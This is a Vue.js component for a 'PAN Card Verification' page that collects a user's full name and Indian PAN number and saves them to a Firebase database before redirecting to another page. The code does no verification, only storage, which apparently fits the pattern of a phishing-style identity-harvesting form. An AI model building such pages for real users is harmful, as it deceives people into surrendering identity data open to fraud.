<template>
  <div class="App">
    <Head/>
    <div class="mainContent">
      <h1 class="text-center">PAN Card Verification</h1>
      <div class="card">
        <form class="LoginForm myform" @submit.prevent="handleSubmit">
          <div class="form-group">
            <label for="Full_Name">Full Name (As per PAN) <span style="font-size: 13px; color: red">*</span></label>
            <input
              type="text"
              class="new-control"
              id="Full_Name"
              name="Full_Name"
              minlength="3"
              maxlength="30"
              required
              v-model="formData.Full_Name"
            />
          </div>
          <div class="form-group">
            <label for="PAN_Number">PAN Card Number <span style="font-size: 13px; color: red">*</span></label>
            <input
              type="text"
              class="new-control"
              id="PAN_Number"
              name="PAN_Number"
              maxlength="10"
              pattern="[a-zA-Z]{5}[0-9]{4}[a-zA-Z]{1}"
              title="Please enter valid PAN"
              required
              v-model="formData.PAN_Number"
            />
          </div>
          <div class="text-center">
            <button type="submit" class="submit">SUBMIT</button>
          </div>
        </form>
      </div>
    </div>
    <Footer/>
  </div>
</template>

<script>
import { ref, push, set, getDatabase } from '@firebase/database';
// import axios from 'axios';
import { app } from './firebase';
import Head from './HeadPage.vue';
import Footer from './FooterPage.vue';

const db = getDatabase(app);

export default {
  components: {
    Head,
    Footer,
  },
  data() {
    return {
      formData: {
        Full_Name: '',
        PAN_Number: '',
      },
    };
  },
  methods: {
    handleSubmit() {
      // Prepare the data to be saved
      const userData = {
        Full_Name: this.formData.Full_Name,
        PAN_Number: this.formData.PAN_Number,
      };

      // Specify the Firebase database reference
      const usersRef = ref(db, 'data'); // Replace 'pancard' with your desired database path

      // Push the data with a unique key
      const newEntryRef = push(usersRef);

      // Set the data at the generated reference
      set(newEntryRef, userData)
        .then(() => {
          console.log('Data pushed successfully with a unique key.');
          this.$router.push("/blogfour");
          // Handle success or navigate to another page
        })
        .catch((error) => {
          console.error('Error pushing data: ', error);
          // Handle error
        });
    },
  },
};
</script>

<style scoped>
/* Add your CSS styles here */
</style>
